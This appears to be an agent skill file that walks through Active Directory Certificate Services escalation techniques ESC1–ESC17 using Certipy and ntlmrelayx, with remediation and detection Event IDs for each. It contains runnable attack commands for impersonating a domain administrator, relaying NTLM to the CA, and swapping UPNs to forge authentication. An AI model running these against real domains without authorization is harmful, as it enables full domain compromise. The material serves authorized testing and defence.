---
name: adcs-attacks
description: Active Directory Certificate Services (AD CS) escalation techniques ESC1 through ESC17, driven by hand with Certipy (ly4k). Use when the target runs a Certificate Authority and you want to find vulnerable certificate templates or CA misconfigurations, request a certificate that impersonates a privileged user, and know the exact certipy command, what each ESC actually checks, the Windows Event IDs that fire, and the remediation. ESC1 and ESC8 are the two you hit most in the field.
---

# AD CS Attacks (ESC1–ESC17)

AD CS is the single richest privilege-escalation surface in modern AD. A misconfigured template or CA lets a low-privileged user obtain a certificate that authenticates as a Domain Admin. This skill uses **Certipy** (the `ly4k` project) throughout. You drive it by hand.

The whole thing starts with one enumeration pass. Run it first, read the output, then pick the ESC that applies.

```
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 -vulnerable -stdout
```

Certipy names each finding by its ESC number, so the tool's output tells you which of the below applies. Save the full JSON/BloodHound output for the report:
```
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 -vulnerable -old-bloodhound
```

The generic exploitation pattern, once you know the template/CA: request a cert, then authenticate with it to recover an NT hash or a TGT. `-target` is the CA/enrollment host and must be an FQDN, not an IP.
```
certipy req -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 \
  -target ca.corp.local -ca CORP-CA -template <VulnTemplate> [attack-specific flags]
certipy auth -pfx administrator.pfx -domain corp.local
```
`certipy auth` performs PKINIT and hands you the TGT plus the NT hash of the impersonated account. If it errors with an object SID mismatch, add `-sid <target-SID>`.

---

## ESC1: Enrollee-supplied SAN (MOST COMMON)

**What it checks.** A template where low-priv users can enroll, the template has an authentication EKU (Client Authentication / PKINIT / Smart Card Logon), and `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, meaning the requester chooses the Subject Alternative Name. You put a Domain Admin's UPN in the SAN and get a cert that authenticates as them.

```
certipy req -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 \
  -target ca.corp.local -ca CORP-CA -template VulnUserTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -domain corp.local
```

**Remediation.** Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from templates that have an authentication EKU. Require CA manager approval for enrollment. Restrict enrollment permissions.

---

## ESC2: Any Purpose / no EKU template

**What it checks.** A template with the Any Purpose EKU (or no EKU at all) that low-priv users can enroll in. The resulting certificate can be used for client authentication (and more), so it behaves like ESC1 without the SAN requirement, subject to how the CA maps it.

```
certipy req -u user@corp.local -p 'Password123' -ca CORP-CA -template AnyPurposeTemplate
```

**Remediation.** Define explicit, minimal EKUs; never leave Any Purpose or empty EKU on enrollable templates.

---

## ESC3: Enrollment Agent certificate

**What it checks.** A template granting the Certificate Request Agent EKU. You enroll to get an enrollment-agent cert, then use it to request a certificate *on behalf of* another user.

```
certipy req -u user@corp.local -p 'Password123' -ca CORP-CA -template EnrollAgentTemplate
certipy req -u user@corp.local -p 'Password123' -ca CORP-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx enrollment_agent.pfx
```

**Remediation.** Restrict who can enroll in enrollment-agent templates; use enrollment-agent restrictions on the CA.

---

## ESC4: Template ACL is writable

**What it checks.** You have write access (GenericWrite/WriteDacl/Owner) over the template object itself. You rewrite the template to be ESC1-vulnerable, exploit it, then revert. Certipy automates the flip.

```
certipy template -u user@corp.local -p 'Password123' -template VulnTemplate \
  -save-old -dc-ip 10.0.0.10
# now exploit as ESC1, then restore:
certipy template -u user@corp.local -p 'Password123' -template VulnTemplate \
  -configuration VulnTemplate.json
```

**Remediation.** Remove write ACEs on template objects for non-Tier-0 principals.

---

## ESC5: PKI object ACL / CA object control

**What it checks.** Control over PKI-related AD objects (the CA computer object, the CA's container in the Configuration partition, etc.). Broad; it collapses to whatever the writable object lets you change. Assess and remediate via the same ACL discipline as ESC4.

**Remediation.** Audit ACLs on the whole `CN=Public Key Services` configuration container.

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA

**What it checks.** The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which lets a requester specify an arbitrary SAN on *any* request regardless of the template. It is effectively domain-wide ESC1. (Note: the May 2022 certificate-mapping hardening blunts SAN-only spoofing on patched DCs, but the misconfiguration is still a finding.)

```
certipy req -u user@corp.local -p 'Password123' -ca CORP-CA \
  -template User -upn administrator@corp.local
```

**Remediation.** Remove the flag: `certutil -config "CA\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`, then restart certsvc.

---

## ESC7: Vulnerable CA access control (ManageCA / ManageCertificates)

**What it checks.** You hold the ManageCA or Manage Certificates right on the CA. ManageCA lets you flip CA settings (e.g. enable ESC6) or add yourself as a certificate manager to approve pending requests.

```
certipy ca -u user@corp.local -p 'Password123' -ca CORP-CA -add-officer user
certipy ca -u user@corp.local -p 'Password123' -ca CORP-CA -enable-template SubCA
```

**Remediation.** Restrict ManageCA/ManageCertificates to Tier-0 CA administrators only.

---

## ESC8: NTLM relay to CA web enrollment (MOST COMMON)

**What it checks.** The CA exposes the HTTP(S) **web enrollment** endpoint (`/certsrv/`, or the CES/CEP web services) without Extended Protection for Authentication (EPA/channel binding). You coerce a privileged machine account (see the coercion + NTLM relay skill: PetitPotam/PrinterBug) to authenticate to your relay, and relay that NTLM authentication to the web enrollment endpoint to enroll a certificate as the coerced machine. A DC's cert means domain compromise.

Find the relay target:
```
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 -stdout | grep -i "Web Enrollment"
```

Stand up the relay (impacket ntlmrelayx targeting the CES/web-enrollment URL):
```
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```
Then coerce a DC to authenticate to your relay host (PetitPotam/Coercer, see coercion skill). Relayed request yields a DC certificate; `certipy auth` it to a TGT.

**Remediation.** Enable **EPA (channel binding)** and require HTTPS on the web enrollment endpoints; disable HTTP. Disable web enrollment if unused. Enforce SMB signing and the NTLM-relay mitigations. Apply the coercion patches.

---

## ESC9: No security extension (szOID_NTDS_CA_SECURITY_EXT absent)

**What it checks.** A template with `CT_FLAG_NO_SECURITY_EXTENSION` set omits the SID security extension. Combined with control over a victim account's `userPrincipalName`, you rewrite the victim's UPN to a target (e.g. an admin), enroll, then restore. The cert maps to the target because the SID binding is missing. Relevant chiefly on DCs configured for the weaker/compatibility certificate-mapping mode.

```
certipy account update -u user@corp.local -p 'Password123' \
  -user victim -upn administrator -dc-ip 10.0.0.10
certipy req -u victim@corp.local -p 'VictimPass' -ca CORP-CA -template ESC9Template
certipy account update -u user@corp.local -p 'Password123' \
  -user victim -upn victim@corp.local        # restore
```

**Remediation.** Do not set `CT_FLAG_NO_SECURITY_EXTENSION`. Move DCs to Full Enforcement certificate mapping (KB5014754). Restrict who can write `userPrincipalName`.

---

## ESC10: Weak certificate mapping (registry)

**What it checks.** DC registry mapping is weakened: `StrongCertificateBindingEnforcement=0` (Kerberos) or `CertificateMappingMethods` includes the weak UPN mapping (Schannel). Same UPN-swap idea as ESC9, driven by the mapping weakness rather than the template flag.

**Remediation.** Set `StrongCertificateBindingEnforcement=2` (Full Enforcement) and remove weak `CertificateMappingMethods` bits (KB5014754).

---

## ESC11: NTLM relay to the CA RPC endpoint (ICertPassage / IF_ENFORCEENCRYPTICERTREQUEST off)

**What it checks.** The CA's RPC enrollment interface (`ICertPassage`) does not require packet privacy (`IF_ENFORCEENCRYPTICERTREQUEST` disabled), so NTLM authentication can be relayed to it over RPC, the ESC8 idea against the RPC interface instead of the web endpoint.

```
ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name CORP-CA \
  --adcs --template DomainController
```

**Remediation.** Enforce RPC encryption on the CA (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`), restart certsvc; apply NTLM-relay mitigations.

---

## ESC12: Shell access via YubiHSM / ADCS CA key on HSM

**What it checks.** The CA private key is stored on a YubiHSM whose auth key is kept in a local registry value. An attacker with shell access to the CA (local admin) can recover the HSM auth key and use the CA private key to forge certificates. This is a post-compromise-of-the-CA-host issue, not a remote low-priv path.

**Remediation.** Protect CA host administrative access as Tier-0; do not store HSM auth material in the registry.

---

## ESC13: Issuance policy linked to a privileged group

**What it checks.** A template carries an issuance policy (`msDS-OIDToGroupLink`) that maps to an AD group. Enrolling in the template yields a certificate that grants the rights of that group. If the linked group is privileged, low-priv enrollment escalates.

```
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 -vulnerable -stdout
# request the flagged template, then auth
```

**Remediation.** Remove `msDS-OIDToGroupLink` mappings to privileged groups; audit issuance-policy OID links.

---

## ESC14: Weak explicit certificate mapping (altSecurityIdentities)

**What it checks.** Write access to a target's `altSecurityIdentities`, or weak explicit mappings there, lets you bind a certificate you control to a privileged account. It is the explicit-mapping analogue of the ESC9/ESC10 implicit-mapping abuses.

**Remediation.** Restrict write access to `altSecurityIdentities`; use strong mapping values (Issuer+Serial, SKI), not weak ones (email/UPN only).

---

## ESC15: EKUwu / application policies (CVE-2024-49019)

**What it checks.** On version-1 templates, a requester can inject arbitrary **application policies** into the CSR, adding a Client Authentication capability the template did not grant. It revives ESC1-style abuse on templates that looked safe.

```
certipy req -u user@corp.local -p 'Password123' -ca CORP-CA -template WebServer \
  -application-policies 'Client Authentication' -upn administrator@corp.local
```

**Remediation.** Apply the CVE-2024-49019 patch. Retire schema-version-1 templates; restrict enrollment.

---

## ESC16: Security extension disabled CA-wide

**What it checks.** The CA is configured to omit the SID security extension on all issued certificates (the `szOID_NTDS_CA_SECURITY_EXT` OID sits in the CA's disabled-extensions list). This makes ESC9-style UPN-swap abuse work domain-wide regardless of template flags.

```
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.10 -stdout   # flags ESC16
```

**Remediation.** Remove the OID from the CA's `DisableExtensionList`; move DCs to Full Enforcement mapping.

---

## ESC17: Weak / abusable Entra (AD CS to cloud) issuance

**What it checks.** The newest class in the Certipy family, covering weak issuance/mapping in hybrid AD CS-to-cloud certificate flows. Certipy's `find` reports it when present. Treat it like the mapping-weakness classes: assess what the issued cert can authenticate as, and whether a low-priv principal can obtain it.

**Remediation.** Enforce strong mapping and minimal EKUs on any template feeding hybrid/cloud authentication; audit the trust.

---

## Cross-cutting

**Where to spend time.** In the field **ESC1** (enrollee-supplied SAN) and **ESC8** (relay to web enrollment) are by far the most common wins. ESC6, ESC9/ESC10/ESC16 (mapping weaknesses) and ESC15 (EKUwu) show up on unpatched or legacy CAs. The rest depend on specific ACL or CA-config misconfigurations that `certipy find -vulnerable` surfaces for you.

**Detection (Event IDs).**
- **4886** (certificate services received a request) and **4887** (a certificate request was approved and issued) on the CA. An anomalous SAN/UPN in an issued cert, or a machine account receiving an authentication cert it should not, is the signal.
- **4768** (TGT requested) via **PKINIT** immediately after issuance, from an unexpected principal, ties the forged cert to its use.
- **5136** on template/PKI objects for the ESC4/ESC5/ESC13 write abuses.
- **4624/4662** for the relay and account-manipulation steps in ESC8/ESC9.

**Baseline remediation across all ESCs.**
- Run `certipy find -vulnerable` yourself and remediate every flagged template before an attacker does.
- Remove enrollee-supplied SAN from auth templates; enforce CA manager approval.
- Enable EPA + HTTPS on web enrollment, enforce RPC packet privacy on the CA.
- Move DCs to **Full Enforcement** certificate mapping (KB5014754); keep the SID security extension.
- Patch CVE-2024-49019; retire schema-v1 templates.
- Tighten ACLs on templates, CA objects, and the PKI configuration container to Tier-0 only.

Only test CAs you are authorized to assess. Use lab/generic CA names, templates and UPNs in write-ups, never a client's real values.

---

## Reference

- AD CS attacks overview (ESC1-ESC16): https://www.thehacker.recipes/ad/movement/adcs/
- Certificate templates (ESC1/ESC2/ESC3): https://www.thehacker.recipes/ad/movement/adcs/certificate-templates
- Web endpoints / NTLM relay (ESC8, ESC11): https://www.thehacker.recipes/ad/movement/adcs/web-endpoints
